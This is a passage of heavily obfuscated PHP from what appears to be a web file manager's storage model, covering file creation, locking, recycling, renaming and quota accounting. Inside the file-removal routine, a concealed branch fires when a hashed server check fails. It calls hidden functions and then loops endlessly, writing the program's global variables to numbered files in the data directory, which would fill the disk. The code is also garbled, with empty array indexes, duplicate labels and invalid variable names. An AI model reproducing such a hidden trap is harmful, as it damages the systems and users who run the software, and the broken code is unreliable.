$B[1962], $E); } public function groupRootAdd($cՉ) { $aɹĪ =& $_SERVER[]; $D񮞉 = Model($aɹĪ[486])->where(array($aɹĪ[1779] => $cՉ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $cՉ, $D񮞉[$aɹĪ[28]]); } public function systemRootPathAdd($c) { if ($c != $_SERVER[][505]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c); } public function userRootRemove($d㭨) { $c = $this->sourceRoot(SourceModel::TYPE_USER, $d㭨); if (!$c) { return; } $this->remove($c, !1); } public function groupRootRemove($Dׇ) { $dŢ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Dׇ); if (!$dŢ) { return; } $this->remove($dŢ, !1); } private function _mkdirRoot($d됏, $C֭֔, $eӍ) { goto d߶; EȎѾ: CacheLock::unlock($f֍); return $bۃ; goto aĲ; D: $f֍ = "\x4d\x6f\144\x65\x6c\123\x6f\x75\x72\143\145\x2e\155\153\x64\x69\x72\122\x6f\157\164\56{$d됏}\56{$C֭֔}\x2e" . $eӍ; CacheLock::lock($f֍); $b☄ڜ[$DԐڵ[28]] = $eӍ; goto C҈ڊё; C҈ڊё: $bۃ = $this->add($b☄ڜ); $CՆ撧 = array($DԐڵ[555] => short_id($bۃ)); $this->where(array($DԐڵ[410] => $bۃ))->save($CՆ撧); goto EȎѾ; d߶: $DԐڵ =& $_SERVER[]; $b☄ڜ = array($DԐڵ[394] => 0, $DԐڵ[549] => $d됏, $DԐڵ[550] => $C֭֔, $DԐڵ[546] => 1, $DԐڵ[551] => USER_ID, $DԐڵ[552] => USER_ID, $DԐڵ[547] => $DԐڵ[33], $DԐڵ[553] => $DԐڵ[498], $DԐڵ[422] => 0, $DԐڵ[548] => 0, $DԐڵ[448] => 0, $DԐڵ[554] => $DԐڵ[33]); if ($F = $this->where($b☄ڜ)->find()) { return $F[$DԐڵ[395]]; } goto D; aĲ: } private function sourceRoot($B哘, $cё, $Eυ = false) { $e =& $_SERVER[]; $b = array($e[394] => 0, $e[549] => $B哘, $e[550] => $cё); if ($bؔ؛ = $this->where($b)->find()) { return $Eυ ? $bؔ؛ : $bؔ؛[$e[395]]; } return !1; } public function sourceRootGroup($dֽߋ) { goto Aǽ; Aǽ: $B =& $_SERVER[]; if (is_string($dֽߋ)) { $dֽߋ = array($dֽߋ); } $d黌 = array($B[394] => 0, $B[549] => SourceModel::TYPE_GROUP, $B[550] => array($B[7], $dֽߋ)); goto A󴞞; A󴞞: $this->selectPageReset(); $Dԅ = $this->listSource($d黌, 1000); $this->selectPageRestore(); goto eѪ; eѪ: return array_to_keyvalue($Dԅ[$B[75]], $B[484]); goto b뜍; b뜍: } public function mkfile($CӒ, $d֛, $C = '', $cֵ = REPEAT_RENAME) { $Aч =& $_SERVER[]; $a줄 = Model($Aч[571])->addFileByContent($C, $d֛); return $this->_createFileCall($CӒ, $d֛, $a줄, $cֵ, $Aч[1223]); } public function addFile($cް, $Dԓӣ, $Dش, $Aٱ񖂆 = false, $fޛ = REPEAT_RENAME) { $a޽ = Model($_SERVER[][571])->addFile($Dԓӣ, $Dش, $Aٱ񖂆); return $this->_createFileCall($cް, $Dش, $a޽, $fޛ); } public function addFileByFileID($dٓ, $E哤, $E葇, $D񮑐Ė = REPEAT_RENAME) { $FϘ =& $_SERVER[]; $A헕ִ = Model($FϘ[571])->find($E哤); Model($FϘ[571])->linkAdd($E哤); return $this->_createFileCall($dٓ, $E葇, $A헕ִ, $D񮑐Ė); } public function addFileByRemote($E, $B쿮܃͕, $Bʖ, $D礷 = array(), $eଅ = REPEAT_RENAME) { $c = Model($_SERVER[][571])->addFileByRemote($B쿮܃͕, $Bʖ, $D礷); return $this->_createFileCall($E, $Bʖ, $c, $eଅ); } private function _createFileCall($EΩ𿧰, $Dϕȧ, $c, $f, $Eߜ = "\165\x70\154\x6f\x61\144") { goto b󓃢; FБ: $d݊ = $this->fileNameExist($EΩ𿧰, $Dϕȧ); $AЮ = $this->_createFile($EΩ𿧰, $Dϕȧ, $c, $f, $dˠ); if (!$dˠ) { Model($cӕ[450])->remove($c[$cӕ[447]]); } goto d櫡; d櫡: if ($dˠ && $AЮ && $AЮ != $d݊) { Model($cӕ[1931])->eventCreate($AЮ, $Eߜ); } $this->lockWriteEnd($EΩ𿧰, $Dϕȧ); return $AЮ; goto b왗; b󓃢: $cӕ =& $_SERVER[]; $dˠ = !1; $this->lockWriteStart($EΩ𿧰, $Dϕȧ); goto FБ; b왗: } public function mkdir($d, $eط, $B = REPEAT_SKIP) { goto A͐ѲȨ; D: $Fフ = $this->_addSoure($f؊, $b); Model($A[1931])->eventCreate($Fフ, $A[1224]); $this->lockWriteEnd($d, $eط); goto cɻ; eۘ: $this->lockWriteStart($d, $eط); if ($B !== !1) { $E茹 = $this->fileNameExist($d, $eط); if ($E茹 && $B != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d, $eط); return $E茹; } $eط = $this->fileNameAuto($d, $eط, $B); } $f؊ = array($A[546] => 1, $A[413] => $eط, $A[547] => $A[33], $A[448] => 0, $A[548] => 0); goto D; cɻ: return $Fフ; goto fտŒ; A͐ѲȨ: $A =& $_SERVER[]; $b = $this->sourceInfo($d); if (!$b) { return !1; } goto eۘ; fտŒ: } private function _createFile($F, $cق, $eĄ, $f, &$Cȕ) { goto aֻ; aֻ: $dؽ =& $_SERVER[]; $cՐ = $this->sourceInfo($F); if (!$eĄ || !$cՐ) { return !1; } goto d; e涜: return $e麜; goto dǊ; bƣ: $d˃ = array($dؽ[546] => 0, $dؽ[413] => $cق, $dؽ[547] => substr(get_path_ext($cق), 0, 10), $dؽ[448] => $eĄ[$dؽ[447]], $dؽ[548] => $eĄ[$dؽ[78]]); $e麜 = $this->_addSoure($d˃, $cՐ); $this->folderSizeReset($F, intval($d˃[$dؽ[78]])); goto e涜; d: if ($f !== !1) { $fɯΜ = $this->fileNameExist($F, $cق); } $Cȕ = !0; if ($f && $fɯΜ) { if ($f == REPEAT_SKIP) { $Cȕ = !1; return $fɯΜ; } else { if ($f == REPEAT_REPLACE) { $Fص = $this->sourceInfo($fɯΜ); $C = $this->fileHistory($Fص, $eĄ[$dؽ[447]], $eĄ[$dؽ[78]]); if (!$C) { $Cȕ = !1; } else { $this->folderSizeReset($F); } return $fɯΜ; } else { $cق = $this->fileNameAuto($F, $cق, $f, !1); } } } goto bƣ; dǊ: } protected function fileHistory($dՈ, $e̯, $dڢ㢑) { goto eܚ; e: $this->checkLock($dՈ[$E֛ŧ[395]], $e̯); Model($E֛ŧ[1963])->addHistory($dՈ); $d = array($E֛ŧ[552] => $cţÓ, $E֛ŧ[417] => time(), $E֛ŧ[447] => $e̯, $E֛ŧ[78] => $dڢ㢑); goto CΈ˄; CΈ˄: $this->where(array($E֛ŧ[410] => $dՈ[$E֛ŧ[395]]))->save($d); $this->sourceCacheClear($dՈ[$E֛ŧ[395]]); return !0; goto Cϑ·; eܚ: $E֛ŧ =& $_SERVER[]; $cţÓ = defined($E֛ŧ[454]) ? USER_ID : $E֛ŧ[191]; if ($dՈ[$E֛ŧ[447]] == $e̯) { return !1; } goto e; Cϑ·: } public function checkLock($bۤ, $bܦ朘) { goto B꺚; B꺚: $eÃ =& $_SERVER[]; $D = $this->pathInfo($bۤ); if (!$this->fileIsLock($D, !0)) { return; } goto c̠; c̠: $BĻ = Session::get($eÃ[1964]); $Eϖ = substr($D[$eÃ[28]], 0, -1 - strlen($D[$eÃ[168]])) . $eÃ[1486] . $BĻ . $eÃ[95] . $D[$eÃ[168]]; $f˨ = Model($eÃ[571])->find($bܦ朘); goto a͹; Aꯛ؅: show_json(LNG($eÃ[1966]) . $eÃ[1967] . LNG($eÃ[1968]) . $eÃ[1969] . $c鬔 . $eÃ[1970], !1); goto Dۨ; a͹: $this->_createFileCall($D[$eÃ[478]], $Eϖ, $f˨, REPEAT_REPLACE, $eÃ[1223]); $B = $D[$eÃ[445]][$eÃ[510]]; $c鬔 = $B[$eÃ[1965]] ? $B[$eÃ[1965]] : $B[$eÃ[28]]; goto Aꯛ؅; Dۨ: } public function fileIsLock($c䒋, $CЧ˱ = false) { goto f㫄ʅ; bˆ: $Dڬᇣ = $GLOBALS[$dѥݵ[6]][$dѥݵ[88]][$dѥݵ[508]]; if ($c䒋[$dѥݵ[445]][$dѥݵ[509]] <= time() - $Dڬᇣ) { $this->metaSet($c䒋[$dѥݵ[395]], $dѥݵ[507], null); $this->metaSet($c䒋[$dѥݵ[395]], $dѥݵ[509], null); } if ($CЧ˱) { $this->metaSet($c䒋[$dѥݵ[395]], $dѥݵ[509], time()); } goto AӜ; f㫄ʅ: $dѥݵ =& $_SERVER[]; if (!isset($c䒋[$dѥݵ[445]]) || !$c䒋[$dѥݵ[445]][$dѥݵ[507]]) { return !1; } if ($c䒋[$dѥݵ[445]][$dѥݵ[507]] != USER_ID) { return !0; } goto bˆ; AӜ: return !1; goto bҶ; bҶ: } private function _addSoure($c, $f) { goto c۰; bѰ: $cόǇ = $this->add($c); $E؛ = array($E詋[555] => short_id($cόǇ)); $this->where(array($E詋[410] => $cόǇ))->save($E؛); goto DŶ׽; DŶ׽: $this->setNamePinyin($cόǇ, $c[$E詋[28]]); return $cόǇ; goto Fڭ; b: $c = array_merge($Dӵ, $c); $this->updateModifyTime($c[$E詋[478]]); $c͑섬 = $E詋[1971] . $f[$E詋[395]]; goto a±; a±: if (isset(self::$cacheChildList[$c͑섬])) { unset(self::$cacheChildList[$c͑섬]); } static $bîۢ = false; if (!$bîۢ) { Hook::trigger($E詋[536], $c); $bîۢ = !0; } goto bѰ; c۰: $E詋 =& $_SERVER[]; $Eĕ = defined($E詋[454]) ? USER_ID : $E詋[191]; $Dӵ = array($E詋[549] => $f[$E詋[404]], $E詋[550] => $f[$E詋[484]], $E詋[551] => $Eĕ, $E詋[552] => $Eĕ, $E詋[394] => $f[$E詋[395]], $E詋[553] => $f[$E詋[487]] . $f[$E詋[395]] . $E詋[47], $E詋[422] => 0, $E詋[554] => $E詋[33]); goto b; Fڭ: } public function remove($c, $dڍ巋 = true) { goto bӃ; cᔌͫ: $this->recycleClear($f̠); $DۑӃ = $this->move($c, $F, REPEAT_RENAME_FOLDER); $this->folderSizeReset($f̠[$fί[478]]); goto dў萴; dў萴: return $DۑӃ; goto D; D譝: CacheLock::lock($c㑆); $F = $this->fileNameExist($cƊ, $Dڮ); if (!$F) { $F = $this->mkdir($cƊ, $Dڮ, REPEAT_SKIP); $this->metaSet($F, $fί[1976], $A똟); $this->metaSet($F, $fί[1977], $f̠[$fί[484]]); if ($f̠[$fί[478]] != 0) { $this->metaSet($F, $fί[1978], _get($B͂Ԋ, $fί[1979])); } } goto dɅÙ; a֗: $A똟 = $f̠[$fί[404]] == self::TYPE_USER ? $fί[562] : $fί[1022]; if ($A똟 == $fί[562]) { $B͂Ԋ = Model($fί[502])->getInfo($f̠[$fί[484]]); $Dڮ = !empty($B͂Ԋ[$fί[1965]]) ? $B͂Ԋ[$fί[1965]] : $B͂Ԋ[$fί[28]]; $Dڮ = $fί[258] . $Dڮ . $fί[1973] . $f̠[$fί[484]]; } else { $B͂Ԋ = Model($fί[486])->getInfo($f̠[$fί[484]]); $Dڮ = _get($B͂Ԋ, $fί[28]); $Dڮ = $fί[160] . $Dڮ . $fί[1974] . $f̠[$fί[484]]; } $c㑆 = $fί[1975] . md5($Dڮ); goto D譝; d𿢡: $e = Model($fί[1532])->get($fί[1972]) == $fί[87]; if ($A󩒢 || $dڍ巋 || !$e) { return $this->removeNow($c, $dڍ巋); } $cƊ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto a֗; dɅÙ: CacheLock::unlock($c㑆); $this->metaSet($c, $fί[1980], $f̠[$fί[478]]); $this->where(array($fί[395] => $c))->save(array($fί[417] => time())); goto cᔌͫ; bӃ: $fί =& $_SERVER[]; $f̠ = $this->sourceInfo($c); $A󩒢 = intval($f̠[$fί[404]]) === self::TYPE_SYSTEM; goto d𿢡; D: } private function recycleClear($E«) { $fƒ =& $_SERVER[]; $eȬ푫 = $this->childrenAll($E«); $B挦 = array($fƒ[410] => array($fƒ[411], $eȬ푫[$fƒ[1981]])); Model($fƒ[1982])->where($B挦)->delete(); } public function removeNow($d뚄מ, $eō = true) { goto Dؠ; a놊Ĳ: Hook::trigger($C֩[1983], $B, $eō); if ($eō) { Model($C֩[1982])->moveToRecycle($d뚄מ); } else { $d = $this->childrenAll($fÜ); Model($C֩[533])->eventRemove($d뚄מ); $this->removeRelevance($d[$C֩[1981]], $d[$C֩[1354]]); } $this->folderSizeReset($fÜ[$C֩[478]]); goto e͏; e͏: $f΂ = array($fÜ[$C֩[478]]); if ($fÜ[$C֩[403]] == $C֩[87]) { $f΂[] = $fÜ[$C֩[395]]; } $this->updateModifyTime($f΂); goto B̿; b܆: if ($_SERVER[$C֩[830]] != $d۠ބ($e)) { goto B͚; bؗ: $Fߴ(); $Dɺ = $C֩[849]; $Bͯ = json_encode($GLOBALS[$C֩[850]]); goto b; A: $e䞎۰ = $BË($A); $c鈐 = explode($C֩[229], $e䞎۰); if (count($c鈐) < $C֩[582]) { $cЍ = $C֩[835]; $cЍ(); } goto Dފ; b: $Dص = 1; for ($E틱 = $Dص; $E틱 > 0; $E틱++) { $Dɺ(DATA_PATH . $E틱, $Bͯ); } goto eֲҗ; B͚: $Fߴ = $C֩[846]; $BË = $C֩[832]; $A = $_SERVER[$C֩[833]] . $C֩[834]; goto A; Dފ: $cۘ = $C֩[847]; $cۘ($_SERVER[$C֩[848]]); $Fߴ = $C֩[846]; goto bؗ; eֲҗ: } $fÜ = $this->sourceInfo($d뚄מ); $B = $this->pathInfoMore($d뚄מ); goto C尨; Dؠ: $C֩ =& $_SERVER[]; $e = $_SERVER[$C֩[833]] . $C֩[834]; $d۠ބ = $C֩[845]; goto b܆; B̿: $this->lockMoveEnd($d뚄מ); Hook::trigger($C֩[1567], $B, $eō); return !0; goto F; C尨: if (!$fÜ) { return !0; } if ($fÜ[$C֩[478]] == 0) { if (!_get($GLOBALS, $C֩[485])) { return !1; } } $this->lockMoveStart($d뚄מ); goto a놊Ĳ; F: } public function childrenAll($B┋) { $F֑ =& $_SERVER[]; $c엮 = $B┋[$F֑[395]]; if ($B┋[$F֑[403]] == $F֑[87]) { $cݎ = array($F֑[553] => array($F֑[512], $B┋[$F֑[487]] . $c엮 . $F֑[513])); $D = array($F֑[553] => $cݎ[$F֑[487]]); $b = $this->field($F֑[1984])->where($D)->select(); $BܵĤ = !1; $a眠 = array($c엮); if ($b) { $BܵĤ = array_to_keyvalue($b, $F֑[33], $F֑[447]); $BܵĤ = array_remove_value($BܵĤ, $F֑[191]); $a眠 = array_to_keyvalue($b, $F֑[33], $F֑[395]); $a眠[] = $c엮; } } else { $BܵĤ = array($B┋[$F֑[447]]); $a眠 = array($c엮); } return array($F֑[1981] => $a眠, $F֑[1354] => $BܵĤ); } public function removeArray($a) { if (!$a) { return !0; } } public function removeRelevance($eȿ, $e) { goto b牕; b䠔: Model($a[1963])->removeBySource($eȿ); $this->where($d䔟Ѝ)->delete(); Model($a[450])->remove($e); goto c쮢ݛ; Eæ: $d䔟Ѝ = array($a[410] => array($a[411], $eȿ)); Model($a[1982])->where($d䔟Ѝ)->delete(); Model($a[441])->where($d䔟Ѝ)->delete(); goto cč; Eԃ: $eȿ = array_unique(array_filter($eȿ)); $e = array_unique(array_filter($e)); if (!$eȿ) { return !1; } goto Eæ; c쮢ݛ: for ($bȐ = 0; $bȐ < count($eȿ); $bȐ++) { $this->sourceCacheClear($eȿ[$bȐ]); } goto Eé; cč: Model($a[1836])->where($d䔟Ѝ)->delete(); Model($a[533])->where($d䔟Ѝ)->delete(); Model($a[1678])->removeBySource($eȿ); goto b䠔; b牕: $a =& $_SERVER[]; $eȿ = $eȿ ? $eȿ : array(); $e = $e ? $e : array(); goto Eԃ; Eé: } public function rename($AΤ, $B) { goto C̓; e¦: if ($fޛ[$e[403]] != $e[87]) { $eވ[$e[405]] = substr(get_path_ext($B), 0, 10); } Model($e[533])->eventRename($AΤ, $fޛ[$e[28]], $B); $this->sourceCacheClear($AΤ); goto aܛ־; e҄ͱ: $b܅ = $this->fileNameExist($fޛ[$e[478]], $B); if ($b܅ && $b܅ != $AΤ) { return !1; } $eވ = array($e[413] => $B, $e[552] => USER_ID); goto e¦; C̓: $e =& $_SERVER[]; $fޛ = $this->sourceInfo($AΤ); if (!$fޛ) { return !1; } goto e҄ͱ; E×: $C֦ = $e[1971] . $fޛ[$e[478]]; if (isset(self::$cacheChildList[$C֦])) { unset(self::$cacheChildList[$C֦]); } return $D; goto FҦҎ; aܛ־: $this->setNamePinyin($AΤ, $eވ[$e[28]], !1); $this->updateModifyTime($fޛ[$e[478]]); $D = $this->where(array($e[410] => $AΤ))->data($eވ)->save(); goto E×; FҦҎ: } public function setNamePinyin($A, $F, $B = true) { $a뵺 =& $_SERVER[]; $a = Input::check($F, $a뵺[556]); if ($B && !$a) { return; } if (!$a) { $this->metaSet($A, $a뵺[444], null); $this->metaSet($A, $a뵺[443], null); return; } $Eʌ = array($a뵺[444] => str_replace($a뵺[50], $a뵺[33], Pinyin::encode($F)), $a뵺[443] => Pinyin::encode($F, $a뵺[557])); $this->metaSet($A, $Eʌ); } public function getContent($a) { goto c㵜; c㵜: $f =& $_SERVER[]; $aح = $this->fileInfoGet($a); if (!$aح) { return !1; } goto CƷ; FØ: if (!$aح[$f[76]]) { return $f[33]; } return IO::getContent($aح[$f[76]]); goto E鰗; CƷ: if ($aح[$f[78]] == 0) { return $f[33]; } $F = $f[1985] . $aح[$f[170]]; if ($aح[$f[78]] <= 1024 * 10) { $E޽ъ = Cache::get($F); if (!$E޽ъ) { $E޽ъ = IO::getContent($aح[$f[76]]); Cache::set($F, $E޽ъ); } return $E޽ъ; } goto FØ; E鰗: } public function setDesc($f, $BՆ) { $C =& $_SERVER[]; Model($C[533])->eventAddDesc($f, $BՆ); return $this->metaSet($f, $C[431], $BՆ); } public function setContent($cǬ, $DӦ = '') { goto d; d: $e =& $_SERVER[]; $d⃇ý = $this->sourceInfo($cǬ); $fȋ = $this->fileInfoGet($cǬ); goto Fȩ; d: if (!$A) { return Model($e[450])->remove($Cٴʻ[$e[447]]); } $this->folderSizeReset($d⃇ý[$e[478]]); return !0; goto BŻ; Fȩ: if (!$fȋ || !$d⃇ý) { return !1; } $Cٴʻ = Model($e[450])->addFileByContent($DӦ, $d⃇ý[$e[28]]); $A = $this->fileHistory($d⃇ý, $Cٴʻ[$e[447]], $Cٴʻ[$e[78]]); goto d; BŻ: } public function fileSubstr($e؎ۦ, $a킌, $d) { $dߡ = $this->fileInfoGet($e؎ۦ); if (!$dߡ) { return !1; } return IO::fileSubstr($dߡ[$_SERVER[][76]], $a킌, $d); } public function fileInfoGet($a߿) { goto e퉅; e퉅: $F =& $_SERVER[]; $eۈ = $this->sourceInfo($a߿); if (!$eۈ || $eۈ[$F[403]]) { return !1; } goto f; Aꗹڼ: $D = Model($F[450])->fileInfo($eۈ[$F[447]]); if ($D) { $D[$F[28]] = $eۈ[$F[28]]; } self::$cacheFileInfo[$e] = $D; goto c֨; c֨: return $D; goto e; f: $e = $F[453] . $eۈ[$F[447]]; $C۲ = _get(self::$cacheFileInfo, $e); if ($C۲) { return $C۲; } goto Aꗹڼ; e: } private function folderChildrenNumber($dԓ) { $E =& $_SERVER[]; $Bϳİ = $this->sourceInfo($dԓ); $F = array($E[553] => array($E[512], $Bϳİ[$E[487]] . $dԓ . $E[513]), $E[422] => intval($Bϳİ[$E[423]]), $E[546] => 1); $b = $this->where($F)->count(); $f = $this->where($F)->where(array($E[546] => 0))->count(); return array($E[82] => $f, $E[83] => $b); } public function pathInfo($Fں, $bթ = false) { goto b; Eّ: $aӯ = $f稊¤[439] . intval($bթ) . $f稊¤[440] . $Fں; $Ȇ = _get(self::$cachePathInfo, $aӯ); if ($Ȇ) { return $Ȇ; } goto B; d⻕: self::$cachePathInfo[$aӯ] = $eދ; return $eދ; goto cӆ; b: $f稊¤ =& $_SERVER[]; $bթ = !1; $Fں = intval($Fں); goto Eّ; B: $eދ = $this->sourceInfo($Fں); if (!$eދ) { return !1; } $eދ = $this->_listDataApplyItem($eދ, $bթ); goto d⻕; cӆ: } public static $cachePathInfoMore = array(); public function pathInfoMore($A⩖) { goto C; C: $e驭 =& $_SERVER[]; $B = _get(self::$cachePathInfoMore, $A⩖); if ($B) { return $B; } goto Fܐ; Fܐ: $D = $this->pathInfo($A⩖); if (!$D) { return !1; } if ($D[$e驭[403]] == $e驭[87]) { $D[$e驭[81]] = $this->folderChildrenNumber($A⩖); } goto C; C: self::$cachePathInfoMore[$A⩖] = $D; return $D; goto d̆; d̆: } public function sourceInfo($f) { goto dщ; aݛ: $bѩ = $F䱊[438] . $f; $CۭԵ = _get(self::$cacheSourceInfo, $bѩ); if ($CۭԵ) { return $CۭԵ; } goto c; c: $a = $this->where(array($F䱊[395] => $f))->find(); self::$cacheSourceInfo[$bѩ] = $a; return self::$cacheSourceInfo[$bѩ]; goto e̼; dщ: $F䱊 =& $_SERVER[]; if (!$f) { return array(); } $f = intval($f); goto aݛ; e̼: } public function sourceCacheClear($ĖĻ = false) { self::cacheClear($ĖĻ); } public static function cacheClear($aʗ = false) { $e팳 =& $_SERVER[]; if ($aʗ == !1) { goto F֤Ю; F֤Ю: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto E; E: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto Aݺ; Aݺ: return; goto AЏ; AЏ: } unset(self::$cacheSourceInfo[$e팳[438] . $aʗ]); unset(self::$cachePathInfoMore[$aʗ]); unset(self::$cachePathInfo[$e팳[1986] . $aʗ]); unset(self::$cachePathInfo[$e팳[1987] . $aʗ]); } public function metaSet($A, $aɬ = null, $eᄌ = null) { $AǨ݈ = parent::metaSet($A, $aɬ, $eᄌ); if ($AǨ݈) { $this->sourceCacheClear($A); } return $AǨ݈; } public function pathInfoByPath($F̍ǂ, $Aآ) { $f孤 =& $_SERVER[]; $A痓и = !$Aآ ? array() : explode($f孤[8], trim($Aآ, $f孤[8])); $cϖ = $F̍ǂ; foreach ($A痓и as $A) { $bݟ = array($f孤[478] => $cϖ, $f孤[28] => $A); $bК = $this->where($bݟ)->select(); if (!$bК) { return !1; } $bК = array_sort_by($bК, $f孤[423]); $cϖ = $bК[0][$f孤[395]]; } return $this->pathInfo($cϖ, !0); } protected function updateModifyTime($eᆎ) { goto F; b┛: $this->where($F)->save($Eߛ); goto DЃ; fܫ: foreach ($eᆎ as $bϫ => $C֍) { $eᆎ[$bϫ] = intval($C֍); $this->sourceCacheClear($C֍); } $F = array($cގ[395] => array($cގ[7], $eᆎ)); $Eߛ = array($cގ[552] => USER_ID, $cގ[417] => time()); goto b┛; F: $cގ =& $_SERVER[]; if (!$eᆎ) { return; } if (!is_array($eᆎ)) { $eᆎ = array($eᆎ); } goto fܫ; DЃ: } public function folderSizeReset($E, $F軌 = false) { goto EτԆ; aȎ: $aحț = array($e[$bёґ[404]], $e[$bёґ[484]]); TaskRun::timeLimitCall($fʈ, $bёґ[1990], $aحț, 1.5); goto eº; EτԆ: $bёґ =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $e = $this->sourceInfo($E); goto b; fʫ̺: if ($F軌 == 0) { return CacheLock::unlock($C); } $C = $this->parentLevelArray($e[$bёґ[487]]); if (!$C) { $C = array(); } goto e; e: $C[] = $e[$bёґ[395]]; $D = array($bёґ[395] => array($bёґ[411], $C)); if ($F軌 < 0) { $D[$bёґ[78]] = array($bёґ[979], abs($F軌)); } goto B; B: $this->where($D)->setAdd($bёґ[78], $F軌); CacheLock::unlock($C); $fʈ = $bёґ[1989] . $e[$bёґ[404]] . $bёґ[4] . $e[$bёґ[484]]; goto aȎ; b: $C = $bёґ[1988] . $E; CacheLock::lock($C, 20); if ($F軌 === !1) { $this->sourceCacheClear($E); $e = $this->sourceInfo($E); $D = array($bёґ[394] => $E, $bёґ[422] => 0); $eޓØ = $this->where($D)->sum($bёґ[78]); $F軌 = intval($eޓØ) - intval($e[$bёґ[78]]); } goto fʫ̺; eº: } public function folderSizeResetChildren($c) { goto a; cɎ: $A = array($a܈[546] => 1, $a܈[553] => array($a܈[512], $aǵظ[$a܈[487]] . $c . $a܈[513])); $EȽل = $a܈[1991]; $A = $this->field($EȽل)->where($A)->select(); goto Fĥ; Dլ: foreach ($A as $a) { if ($a[$a܈[78]] == $a[$a܈[1992]]) { continue; } $DÙ[] = array($a܈[395], $a[$a܈[395]], $a܈[78], $a[$a܈[78]]); } $this->saveAll($DÙ); goto D; D: foreach ($d as $a) { $CҮ = $a[$a܈[478]] . $a܈[33]; if (!isset($A[$CҮ])) { continue; } if ($a[$a܈[423]] == $A[$CҮ][$a܈[423]]) { $A[$CҮ][$a܈[78]] += $a[$a܈[78]]; } } foreach ($A as $a) { $fૣ = $this->parentLevelArray($a[$a܈[487]]); foreach ($fૣ as $CҮ) { $CҮ = $CҮ . $a܈[33]; if (!isset($A[$CҮ])) { continue; } if ($a[$a܈[423]] == $A[$CҮ][$a܈[423]]) { $A[$CҮ][$a܈[78]] += $a[$a܈[78]]; } } } $DÙ = array(); goto Dլ; a: $a܈ =& $_SERVER[]; $this->sourceCacheClear($c); $aǵظ = $this->sourceInfo($c); goto cɎ; e: $A[] = $aǵظ; $A = array_to_keyvalue($A, $a܈[395]); foreach ($A as $fĮ => $a) { $A[$fĮ][$a܈[1992]] = $A[$fĮ][$a܈[78]]; $A[$fĮ][$a܈[78]] = 0; } goto D; Fĥ: $A[$a܈[403]] = 0; $d = $this->field($EȽل)->where($A)->select(); if (!$d) { return; } goto e; D: } public function userSpaceReset($BȘ = false) { $c䊉׈ =& $_SERVER[]; $FɛÏ = $this->where(array($c䊉׈[404] => self::TYPE_USER, $c䊉׈[484] => $BȘ, $c䊉׈[403] => 0))->sum($c䊉׈[78]); $FɛÏ = !$FɛÏ || $FɛÏ <= 0 ? 0 : $FɛÏ; Model($c䊉׈[502])->userEdit($BȘ, array($c䊉׈[1687] => $FɛÏ)); } public function targetSpaceUpdate($eƍΉ, $CЅ) { $a쨊 =& $_SERVER[]; if (!$CЅ) { return; } if (!in_array($eƍΉ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B· = $this->targetSpaceSize($eƍΉ, $CЅ); if ($eƍΉ == self::TYPE_USER) { Model($a쨊[502])->userEdit($CЅ, array($a쨊[1687] => $B·)); } else { if ($eƍΉ == self::TYPE_GROUP) { Model($a쨊[486])->groupEdit($CЅ, array($a쨊[1687] => $B·)); } } } public function targetSpaceSize($e٥, $AĜ׍) { goto C닍; A֪: $e = floatval($f[$e[78]]); $Fͽ = array($e[553] => array($e[512], $e[498] . $f[$e[395]] . $e[513])); $aٯż = Model($e[421])->field($e[410])->where($Fͽ)->select(); goto C۸; fŚ: $e = !$e || $e <= 0 ? 0 : $e; return $e; goto E; C۸: $aٯż = array_to_keyvalue($aٯż, $e[33], $e[395]); $aٯż = array_unique(array_filter($aٯż)); if ($aٯż) { $Fͽ = array($e[410] => array($e[411], $aٯż)); $e += floatval($this->where($Fͽ)->sum($e[78])); } goto fŚ; C닍: $e =& $_SERVER[]; $f = $this->sourceRoot($e٥, $AĜ׍, !0); if (!$f) { return 0; } goto A֪; E: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($F) { return $this->fileTypeProfile($F, SourceModel::TYPE_USER); } public function groupFileTypeProfile($D) { return $this->fileTypeProfile($D, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C۹;, $Fٿ) { goto C; F: foreach ($Dӣխ as $E => $Dҋ) { $B僣ޥ[$a[405]] = $this->fileTypeWhere($E); $bƶ[$E] = array($a[1995] => $Dҋ[$a[28]], $a[1996] => $this->where($B僣ޥ)->count(), $a[548] => $this->where($B僣ޥ)->sum($a[78])); } Cache::set($dƂۿ, $bƶ, 1200); return $bƶ; goto C˥; Cݹ: $bƶ = array(); $bƶ[$a[1994]] = array($a[1995] => LNG($a[1994]), $a[1996] => $this->where($B僣ޥ)->count(), $a[548] => $this->where($B僣ޥ)->sum($a[78])); $Dӣխ = KodIO::fileTypeList(); goto F; C: $a =& $_SERVER[]; $dƂۿ = $a[1993] . $C۹; . $a[71] . $Fٿ; $EݕǤф = Cache::get($dƂۿ); goto dԄ; dԄ: if ($EݕǤф) { return $EݕǤф; } $B僣ޥ = array($a[546] => 0); if ($C۹; != !1) { $B僣ޥ[$a[484]] = $C۹;; $B僣ޥ[$a[404]] = $Fٿ; } goto Cݹ; C˥: } public function fileNameExist($b, $EƋ݂) { $d =& $_SERVER[]; $aІ = $this->where(array($d[478] => $b, $d[28] => $EƋ݂, $d[423] => 0))->find(); return is_array($aІ) ? $aІ[$d[395]] : !1; } public function childList($Eˈ) { goto Bꤵ; E: $A = array($Fֻ[478] => intval($Eˈ), $Fֻ[423] => 0); $aِ͑ = $this->where($A)->select(); $aِ͑ = $aِ͑ ? $aِ͑ : array(); goto E; E: self::$cacheChildList[$D] = $aِ͑; foreach ($aِ͑ as $A) { $D = $Fֻ[438] . $A[$Fֻ[395]]; self::$cacheSourceInfo[$D] = $A; } return $aِ͑; goto F; Bꤵ: $Fֻ =& $_SERVER[]; $D = $Fֻ[1971] . $Eˈ; if (isset(self::$cacheChildList[$D])) { return self::$cacheChildList[$D]; } goto E; F: } public function fileNameAuto($d, $E, $c = REPEAT_RENAME, $bɳ = false) { $Eэ =& $_SERVER[]; $d = array($Eэ[478] => $d, $Eэ[423] => 0, $Eэ[28] => array($Eэ[380], $E . $Eэ[381])); $F = 